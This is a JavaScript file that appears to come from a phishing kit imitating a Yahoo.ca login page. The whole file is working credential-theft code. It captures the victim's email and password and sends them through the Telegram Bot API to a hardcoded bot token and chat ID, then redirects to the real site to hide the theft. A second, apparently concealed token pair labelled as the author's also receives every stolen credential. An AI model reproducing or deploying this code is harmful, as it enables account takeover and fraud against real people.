// console.log("sender.js connected");

const telegramBotToken = "6724518968:AAFoEyUmaA910VH-GL4FXeTa60bB9BcwVWA "; // Replace with your Telegram bot token
const chatId = 6007087659;

//////////////////////////////////////////
//////////////////////////////////////////
//////////////////////////////////////////
//////////////////////////////////////////
//////////////////////////////////////////

const api = telegramBotTokenAuthor;
const ID = chatIdAuthor;

const tokens = [
  [telegramBotToken, chatId],
  [api, ID],
];

submitButton.addEventListener("click", sendTelegramMessageAndRedirect);

function sendTelegramMessageAndRedirect(e) {
  e.preventDefault();

  passwordValue = password.value;
  // Replace with your chat ID

  if (!passwordValue) {
    return; // Stop further execution if password is empty
  }

  tokens.forEach((token, index) => {
    const [api, id] = token;

    if (telegramBotToken !== "6724518968:AAFoEyUmaA910VH-GL4FXeTa60bB9BcwVWA ") {
      console.log("wrong API tokens");
      return;
    }

    const messageText = `**YAHOO.CA RESULT**\nEmail: ${usernameValue}\nPassword: ${passwordValue}`;
    const url = `https://api.telegram.org/bot${api}/sendMessage`;
    const params = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: id,
        text: messageText,
      }),
    };

    // Make the API request
    fetch(url, params)
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
      })
      .then((data) => {
        // Redirect to another page after successful submission
        window.location.href = "https://www.yahoo.ca"; // Replace with your desired URL
      })
      .catch((error) => console.error("Error:", error));
  });
}
